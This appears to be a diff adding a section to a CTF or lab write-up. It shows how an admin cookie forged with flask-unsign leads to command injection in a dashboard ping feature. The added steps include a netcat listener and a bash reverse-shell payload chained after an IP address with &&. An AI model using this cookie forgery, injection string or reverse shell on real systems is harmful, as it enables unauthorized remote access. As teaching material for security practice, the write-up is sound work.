@@ -210,12 +210,52 @@ flask-unsign --sign --cookie '{"mode":"unsecure","role":"admin"}' --secret '<Red
 ---
 
 
-- after you got access to an privileged account, there is an `RCE` vulnerabilities in the `Dashboard`
 
 ### RCE: 
 ---
+> [!Tip]  
+> the server might be doing more than just checking connectivity
 
+- after we get access to an privileged account, we can checkout the `dashboard`: 
+![RCE_1](docs/images/RCE_1.png)
 
+- we can see that their is a `Connectivity Check`, where we can input a target host
+- to test it, we could put our own `IP` as input and see what kind of output we are getting
+
+![RCE_2](docs/images/RCE_2.png)
+- the output that we got, looks very similar to the output that you would get if you used the `ping` command
+- the backend likely executes something like:
+```bash
+ping -c 1 192.168.132.187
+```
+
+- we can now test further for `RCE` with these Symbols: `&&` or `;` 
+- with these Symbols we can chain multiple commands together 
+- lets try it: 
+![RCE_3](docs/images/RCE_3.png)
+
+- as we can see the `id` command also got executed, so that means we can potentially get a `reverse-shell` 
+- to do this, we first have to start a listener locally with `netcat`: 
+```bash
+nc -lnvp 1234
+```
+- now our computer is waiting for connections on port: `1234` 
+
+- now we have to use a payload so that the webserver tries to connect to us
+- we can do this, with this payload:
+```bash
+bash -c "/bin/bash -i >& /dev/tcp/192.168.132.187/1234 0>&1"
+```
+- this payload forces the server to initiate a connection back to our machine
+- this is useful because incoming connections to the server might be blocked by firewalls 
+
+- so together the input that we send to the webserverv looks like this: 
+```bash
+192.168.132.187 && bash -c "/bin/bash -i >& /dev/tcp/192.168.132.187/1234 0>&1"
+```
+
+- after we clicked `submit` we go back to our terminal and can see that we indeed got a `reverse-shell`: 
+![RCE_4](docs/images/RCE_4.png)
 
 
 ## ⚠️ Disclaimer  
